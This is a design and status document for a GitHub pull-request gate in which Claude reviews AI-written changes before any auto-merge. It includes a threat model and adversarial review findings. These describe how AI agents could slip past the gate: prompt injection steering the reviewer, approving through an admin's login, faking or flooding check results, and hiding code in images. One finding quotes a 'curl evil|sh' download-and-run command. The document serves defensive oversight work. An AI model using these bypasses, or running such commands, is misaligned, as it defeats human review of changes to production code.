# Build Autopilot v2: the GitHub gate

**Status (2026-10-15):** built and tested here; not installed in any repo. Nothing pushed, no GitHub repos or apps
created. A separate Opus agent reviewed it adversarially; what it found and what changed is under
[Adversarial review](#adversarial-review).

## What it does

On every pull request in a repo whose default branch has `.github/autopilot.json`:

1. **Review.** Claude Opus 5.5 reads the change (as data, never run) and posts one plain-English comment:
   **Approved**, **Changes needed** or **Needs a person**, with what happens next.
2. **Sensitive files.** Under rule `two-ai`, a second, independent, adversarial security review runs; both must
   approve. Under rule `human`, the change waits for a person whatever the level.
3. **Auto-merge.** At level `auto-merge` or `autopilot`, an approved change gets GitHub auto-merge, pinned to the
   exact commit that was reviewed, and merges when the required tests pass.
4. **Never merges itself:** changes to `.github/autopilot.json`, the gate (`.github/autopilot/**`), any workflow
   (`.github/workflows/**`, `.github/actions/**`), any local action a workflow runs (`uses: ./path`), or
   `.gitattributes`. Dependency manifests and lockfiles, and scripts the workflows run (`./scripts/ci.sh`), count as
   sensitive whatever the settings list.
5. **Settings from the default branch only.** A pull request can't change the settings it is judged by.

Nothing is decided silently. Every gate comment ends with **Decided without you**: each choice automation made on a
person's behalf (auto-merge turned on or off, merged right away, no second review because the rule is `same`, an
always-ask flag this repo's settings don't stop for, files nobody can read let through), with why and how to undo it.
If there were none it says "Decided without you: nothing". A skipped duplicate test run on `main` is reported the same
way, in the run summary and on the merged pull request.

Three comment commands on a pull request:
- `/autopilot approve <full commit id>` (repo admins and maintainers who didn't open it or write its commits): signs
  off a "needs a person" change for exactly that commit, and turns off any auto-merge someone else switched on; a
  person still clicks merge.
- `/autopilot stop` (anyone who can push), or adding the `autopilot-hold` label: puts it on hold. Auto-merge goes off
  and the check stays red. The label's own history (which nobody can edit) decides who removed it: only an admin, a
  maintainer or `/autopilot resume` lifts a hold; if anyone else removes the label, the gate puts it back.
- `/autopilot resume` (admins and maintainers): lifts the hold and the review runs again.

| Part | File |
|---|---|
| Workflow template | `templates/github/workflows/autopilot.yml` |
| Gate logic | `templates/github/autopilot/gate.py` |
| Pinned Claude SDK | `templates/github/autopilot/requirements.txt` |
| Duplicate-test skip | `templates/github/autopilot/skip_duplicate_main.py` |
| Install steps for `/build-autopilot:autopilot apply` | `docs/v2-install.md` |
| Tests (71) | `scripts/test_gate.py` |
| Dry run, one scenario per rule, incl. what each reports under "Decided without you" | `scripts/gate_dryrun.py` (last output: `out/gate-dryrun.txt`) |
| Draft for chasing-shade's test.yml (not applied) | `drafts/chasing-shade/test.yml`, `test.yml.patch` |

## How it is built, and why

```
pull_request_target (workflow + checkout always from the default branch)
  mark    [env autopilot]                             head commit -> "pending" (closed unmerged -> "failure")
  review  [env autopilot-review: ANTHROPIC_API_KEY]   git-fetch PR as data -> classify -> Claude review(s) -> job output
  decide  [env autopilot: GitHub App key]             re-read PR live + re-classify -> combine -> check run, comment, auto-merge
issue_comment
  command [env autopilot]                             "/autopilot approve <sha>" (admin) -> success for that sha
                                                      "/autopilot stop" (can push) -> hold record, red, auto-merge off
                                                      "/autopilot resume" (admin) -> lift hold, review again
```

- **`pull_request_target`, not `pull_request`.** With `pull_request`, a pull request runs its own copy of the
  workflow and could rewrite the gate. Since GitHub's 2025-12-08 change, `pull_request_target` always runs the
  workflow file and checkout from the default branch.
- **Nothing from the pull request runs.** The gate fetches the pull request's commits and runs `git diff` with hooks,
  external diff and textconv programs off and attributes read from an empty tree, so no `.gitattributes` can hide a
  diff. Title, description, file names and code go to Claude inside a fenced, randomly named block marked untrusted,
  and are never put into a shell command or workflow expression. File names are escaped wherever they are shown.
- **Binary files:** let through only for PNG images whose whole structure checks out (every chunk's checksum, the
  image data decompresses, nothing after the end). Every other binary, Git LFS pointers included, needs a person: GIF, WebP, font and 3D-model
  headers can also start a working JavaScript file.
- **What the person reads can't be faked.** Anyone who can push can edit any comment, so the full review also goes
  to the `autopilot/gate` check run's details and the run summary (only the app can write either), and
  `/autopilot approve` is refused if anyone
  but the app edited the gate's comment.
- **Secrets in environments locked to the default branch.** A workflow added by a pull request runs on
  `refs/pull/N/merge` and can't use them; the gate's own runs count as the default branch.
- **A dedicated GitHub App, not the workflow token.** Merges made with the built-in token don't start other
  workflows (nothing would deploy after an auto-merge), and the required `autopilot/gate` check is tied to the app's
  ID in the ruleset so other automation can't fake it.
- **Two jobs.** The job that installs the Claude SDK from PyPI never holds the GitHub App key; the job that holds the
  key uses only Python's standard library and re-checks the change itself before trusting the review job's result.
- **Fail closed.** Unreadable settings, a review that errors, is refused, is cut off or returns malformed JSON, a
  diff too big to read, submodules, symlinks, compiled binaries, a hand-over that doesn't match the commit: all end in
  "needs a person", never "approve". No refusal fallback to a weaker model, on purpose.
- **Checks its own setup.** Before turning on auto-merge, the gate reads the branch rules and refuses unless pull
  requests are required, `autopilot/gate` is required from the app, and at least one test check is required too.

## Threat model

**What we protect:** the default branch (and, at `autopilot`, production), the GitHub App key, the Anthropic key.

**Who might attack:** the AI agents that write pull requests (Sling, Claude sessions), including through prompt
injection in issues, web pages or code they read; anyone with push access; outside contributors via forks.

| Threat | What stops it | Left over |
|---|---|---|
| PR edits the gate or the workflow so it approves itself | `pull_request_target` runs the default branch's copy; such PRs are "needs a person" | A person approving a malicious gate change |
| PR grants itself a higher level in `autopilot.json` | Settings read from the default-branch checkout; the file is a never-auto-merge path | none |
| PR adds a workflow that posts `autopilot/gate: success` | The result is a check run owned by the app, and the ruleset pins the check to the app's ID: other workflows' check runs or statuses with that name don't count and can't change it; app key is environment-locked | Must be configured exactly as in v2-install.md; verify with the spoof test there |
| Flooding the result (1000 junk statuses froze the old commit-status result) | Check runs belong to the app that created them; the gate updates its own run in place, and reads only its own app's runs | none known |
| PR adds a workflow that reads secrets | Gate secrets live only in default-branch-locked environments | Repo- or org-level secrets the repo already has are as exposed as today |
| Push after approval (review commit A, merge commit B) | The check run is per commit; auto-merge pinned with `expectedHeadOid`; direct merge pinned with `sha` | none known |
| Reusing an old approval of the same commit (new PR, cancelled run) | Every run first marks the commit "pending"; closing a PR unmerged marks it "failure" | A write user cancelling the run leaves "pending": blocked, not merged |
| Cancelling a review, hold or approval by pushing/commenting/relabelling | No workflow-wide concurrency; only review/decide of the same PR replace each other | none known |
| Lifting a hold without a person | The label's event history (uneditable) decides; removal by anyone but an admin, maintainer or the app is undone | none known |
| Editing the gate comment before a person approves | Full review in the run summary; approval refused if the comment was edited by anyone but the app | none known |
| Cancelling runs (needs `actions: write`) | A cancelled run leaves "pending" or nothing: blocked, not merged | Cancel the very first run on a commit an earlier PR approved and the old result stands until the next run; keep `actions: write` away from agents |
| Merging a green pull request by hand | Required checks and the ruleset | Anyone with write access, an agent included, can merge a green PR or turn auto-merge on after a person approves; GitHub has no "only this app may merge" rule short of restricting who can push |
| Same commit approved in a PR to another branch, reused for the default branch | The gate writes results only for PRs into the default branch | none known |
| Prompt injection steering Claude to approve | Fenced untrusted block; reviewer told to flag attempts (flag = needs a person); deterministic rules for settings/workflows/human paths don't depend on the model; sensitive areas get a second, adversarial review | **Main residual risk.** A clever injection in a non-sensitive file could still win one review. Keep `sensitive.paths` broad |
| Hiding code from the reviewer | Diff over 600k characters, submodules, symlinks, any binary but a well-formed PNG, LFS pointers all need a person; `.gitattributes` ignored when diffing; path rules match case-insensitively, renames check both paths, a matched folder covers its files | Logic hidden in plain sight in a non-sensitive file (same as any human review); a valid PNG can still carry text inside it (for example in uncompressed image data), which matters only if something on `main` already runs an image file with `sh` |
| Malicious dependency in the Claude SDK | Exact versions with hashes; that job holds only the Anthropic key and can't write to GitHub | A compromised pinned version could leak the Anthropic key |
| Agent posts `/autopilot approve` using a person's login | Only admins/maintainers who didn't open the PR, push to it (the app records each pusher in its own check run) or appear as a commit author/committer; full 40-character commit id; app/bot comments refused; a re-run, deleted, edited or pre-hold comment doesn't count | **Real:** Claude sessions use David's own `gh` login, so the gate can't tell David from an agent acting as David. See decision 3 |
| Admin merges around the gate | Ruleset with no bypass list | Any admin token (incl. a Claude session using it) can still change rules; that is GitHub's model |
| Fork PRs spending money | Forks get "needs a person" with no Claude call | none |
| Cost run-up from many pushes | One review per push, latest push cancels the older run | No hard cap in the gate; set an Anthropic workspace spend limit |

## What still needs David's decision

1. **Create the Build Autopilot GitHub App** in each org (Velocity-Org first) and hold its key. Without it the gate
   can review and comment but never auto-merge. Per org or one shared app across orgs?
2. **The Anthropic key** for the review job: which workspace, and a monthly spend cap. Rough estimate for
   chasing-shade (65 merged PRs in 30 days, a few pushes each): 150-250 reviews a month at roughly $0.15-0.50 each, plus
   the second review on sensitive changes: about $40-150/month. Not measured; no live call was made.
3. **Who may `/autopilot approve`, and which login agents use.** Default now: admins and maintainers, but never on a
   pull request they opened or wrote commits in (`AUTOPILOT_ALLOW_SELF_APPROVE: "false"`, the reviewer's
   recommendation). Cost: a PR that David's own Claude session opened (for example an `/build-autopilot:autopilot apply` update) needs
   another admin's approval, or David temporarily switching the ruleset off in GitHub's settings. The real fix is
   for agents not to run with an admin's login: give Claude sessions and Sling a separate identity with write access
   only. Until then, no comment-based check can tell David from a script using David's token, and an admin token can
   also edit the ruleset itself. The self-approval guard is part of the same residual risk: commit author and
   committer fields are whatever the pusher writes, so the guard relies mainly on who opened the PR and who pushed
   (recorded by the app); an agent pushing as a separate identity and asking David to approve is exactly the flow it
   allows. Pushes made before the pull request was opened (to its branch, while no PR existed) aren't recorded at
   all; only the sender of the event that opens it is.
4. **Ruleset bypass list:** recommended empty. Adding admins makes merging around the gate one checkbox away, for
   people and for sessions using their login.
5. **Pull requests into other branches** (chasing-shade's `portal-default`): today advice only (comment, no status, no
   auto-merge). Govern them too?
6. **Effort level** for the reviews: `high` now. `xhigh` for the security review costs more and reads more carefully.
7. **v1 behaviour once v2 is in.** v1 tells Claude sessions to turn on auto-merge themselves. After v2 is installed in
   a repo, sessions should stop doing that and leave it to the gate (the `autopilot-policy` skill needs a line).
8. **Binary assets.** Only well-formed PNG images pass on their own. JPEGs, ICOs, GIFs, WebP, fonts and 3D models
   (chasing-shade's `.glb` assets) need `/autopilot approve`. Accept that, or allow them under named asset folders
   with a structure check per format (more code to review).
9. **Release workflow for `autopilot`** (deploy + health check + undo) and `tests.lane: fast-lane` are not built; the
   gate treats `autopilot` like `auto-merge` for now.

## Adversarial review

A separate Opus agent tried to break the gate (no files changed, no GitHub writes). Its main findings, all fixed here
and covered by tests or dry-run scenarios:

| Finding | Fix |
|---|---|
| Any push, comment, label change or title edit could cancel a pending `/autopilot stop` or approval, or an in-progress review (workflow-wide concurrency) | Concurrency only on the review and decide jobs; comment commands never cancelled |
| The hold didn't stop a merge: the check stayed green; anyone could remove the label; `AUTOPILOT-HOLD` didn't count | Hold = red check; stored in the app's own record; label removal is undone; case-insensitive; only `/autopilot resume` by an admin lifts it |
| Readable code could pass as an "unreadable binary" (a `.js` file with a NUL byte), and a merged `*.ts -diff` in `.gitattributes` would hide every later `.ts` diff | Attributes read from an empty tree; binary allowed only for image/font/model names with matching first bytes; LFS pointers blocked; `.gitattributes` never auto-merges |
| `/autopilot approve` took a 7-character prefix, which an agent can match with a different commit in about a minute | Full 40-character commit id only |
| An agent using an admin's login could approve its own PR | Self-approval off by default (decision 3) |
| Auto-merge switched on by someone else survived a person's approval | Approval turns it off; the gate replaces anyone else's auto-merge with its own, pinned to the reviewed commit |
| An old approval of the same commit could be reused if the new run was cancelled | Each run marks the commit "pending" first; closed unmerged marks "failure" |
| File names (which may contain newlines) reached the reviewer outside the untrusted block and the comment unescaped | Names escaped everywhere, moved inside the block; control characters need a person; reviewer text can't add headings |
| `skip_duplicate_main` accepted a test run from when the PR targeted another branch | The test workflow's run title records the commit GitHub actually tested; main skips only when that commit's files equal the merged files exactly, and never for a PR that touched `.github/` |
| Scripts CI runs and dependency manifests were guarded only by the general review | Both are sensitive (second review under `two-ai`) |
| `ubuntu-latest` moving past Python 3.12 would break the hash-pinned install | Runners pinned to `ubuntu-24.04` |

A second pass by the same reviewer found the first hold fix could be erased (anyone who can push can delete or edit
any comment), the media check let a `GIF89a=1//` JavaScript file through, `skip_duplicate_main` relied on an
undocumented API field, and two orderings could let a merge slip in. Fixed as described above: hold from the label's
uneditable history, PNG/JPEG/ICO only with structure checks (narrowed to PNG in round 4), the recorded tested tree, auto-merge off before any
green status, and approvals refused when the gate comment was edited by anyone else.

A third, short check of those fixes confirmed them and found smaller gaps, also fixed: the first "tested" record was a
commit status any workflow could fake (now the test workflow's own run title, which no other workflow can set); an
admin removing the hold label by hand left the PR red (the review now runs for removals by people); the comment-edit
check read only the oldest 100 edits (now the newest, plus the last editor); a flood of label events could hide a hold
(history now read newest-first, and an unreadably long history counts as held); and a hold added by label didn't
override a person's earlier approval (it does now).

**Round 4** (a fresh Opus re-review before committing: 0 critical/high, 2 medium, 7 low, 1 note):

| Finding | Fix |
|---|---|
| (medium) Re-running an old command run replayed it: an old `/autopilot resume` lifted a later hold, an old approve turned the check green, even with the comment deleted | Commands count only on the run's first attempt, only if the comment still exists unedited, and only if it is newer than the latest hold change; approve is refused while on hold |
| (medium) 1000 junk `autopilot/gate` statuses on a commit froze its check green, so a stop failed silently | Stop puts the label on and auto-merge off before the status; any red result that can't be posted turns the PR back into a draft and fails the job loudly (superseded in round 5 by the check run) |
| Race between decide and a stop | The hold is read again right before anything turns green, and again after auto-merge is turned on (turned off and red if held) |
| Reviewer text could carry HTML, links and images into the comment | `<`, `>`, `&` escaped; Markdown link/image brackets escaped; bare links broken |
| "Decided without you" missing from stop/resume/approve/refusal replies, label restore not reported, notes after the section | Every command reply ends with the section; putting the hold label back is reported; the section is always last |
| JPEG and ICO checks were shallow (a JPEG with `curl evil|sh` in the middle passed) | Only PNG passes alone, with image data that must decompress; JPEG/ICO need a person |
| Self-approval relied on commit author fields the pusher controls | Also refuses whoever pushed (recorded by the app; in its check run since round 5); residual risk spelled out under decision 3 |
| File names with right-to-left overrides, zero-width or C1 control characters passed | Any Unicode Cc/Cf/Zl/Zp character needs a person |
| Very long reviews could exceed the 128 KB limit on the environment variable carrying them, leaving the PR pending | Review text capped; an oversized hand-over becomes an error, which reads as "needs a person" |
| Removing the hold label without rights still paid for an Opus review | The review is skipped when the remover can't lift a hold (the label goes back anyway) |
| (note) Required test checks pinned to GitHub Actions (15368) can be faked by any workflow on any branch that asks for `checks: write` | Documented in v2-install.md with the options; accepted as residual by default |

All round-4 fixes have a test or dry-run scenario.

**Round 5** (the reviewer's re-check of round 4: one medium still open, one low, one cosmetic):

| Finding | Fix |
|---|---|
| (medium) Status flooding still defeated a hold: with the 1000 status slots full, a stop couldn't post red, the draft conversion could be undone with `gh pr ready` and the frozen green merged; closing and reopening worked the same way | The gate's result is now a **check run** owned by the app: mark creates one per gate run (pending), and decide, stop, approve and close update it in place. Only the app can write it, there is no shared cap, and the ruleset pins it by app ID. The pusher record moved into the same check run (carried across pushes via the previous head). The draft conversion stays as belt and braces for a refused write |
| (low) The paid-review skip treated a failed permission lookup as "can't lift a hold" | A failed lookup now runs the review; the review job keeps its read-only token |
| (cosmetic) A `#` line in a quoted summary rendered as a heading; file names in reasons showed escaped twice | Leading `#` neutralised in quotes; escaping skips inline code spans |

**Round 6** (three lows and a wording fix):

| Finding | Fix |
|---|---|
| If GitHub won't change a completed run's conclusion, a stop or hold couldn't turn a green run red | A refused update starts a new failing `autopilot/gate` run (the newest run is the one that counts), keeping the pusher record; only if that is refused too does the PR go back to draft. Closing unmerged uses the same fallback |
| Pushes made while the PR was a draft weren't recorded | The mark job runs for draft pushes too; on `ready_for_review` it gathers the pushers recorded on every commit of the PR, plus the sender. Pushes made before the PR was opened stay unrecorded (decision 3) |
| The gate read only the first page (100) of its check runs on a commit, so after many label toggles it could read and write an old one | All pages are read and the newest run (highest id) is used; more than 5000 runs on one commit fails closed |
| v2-install.md said other apps couldn't create a run named `autopilot/gate` | Reworded: they can; the ruleset's `integration_id` pin makes theirs not count, and only the app can update its own run |
| (Delta check) With `AUTOPILOT_APP_ID` unset, the check-run query dropped its app filter, so anyone's same-named runs could flood it and a hold fell back to an undoable draft | The gate refuses to run (mark, decide and the commands) without the App ID and slug, and the reader refuses an unfiltered query |

To verify live (step 5 of v2-install.md): that a completed check run's conclusion can be changed by PATCH (stop
turning a green run red relies on it, as GitHub documents) and that the ruleset ignores same-named check runs from
other apps.

Left as decisions or residual risk: one app key shared across repos (decision 1), agents with admin tokens or
`actions: write` (decision 3), anyone with write access merging a green PR by hand, required test checks that a PR's
own workflow could fake (see v2-install.md), and logic hidden in plain sight in a non-sensitive file.

## Found along the way

- **Velocity-Org/chasing-shade's `main` has no branch rules or rulesets at all** (checked 2026-10-15). Anyone or
  anything with push access can push straight to `main`, and v1's "turn on auto-merge" there merges immediately rather
  than waiting for tests. The v2 ruleset fixes both; worth doing even before the gate.
- The org is on GitHub Team, so rulesets and auto-merge work on private repos; chasing-shade already allows auto-merge.

## Not verified

- No live Claude call (the request shape was checked against the pinned SDK with a local stand-in server).
- Not run on GitHub: the workflow, environment locks, app token, ruleset pinning and auto-merge calls are exercised
  only against a fake GitHub. Step 5 of v2-install.md is the live check, including the spoof test.
- The GitHub behaviours the design relies on are from GitHub's documentation and changelog (cited in the threat
  model), not tested live.
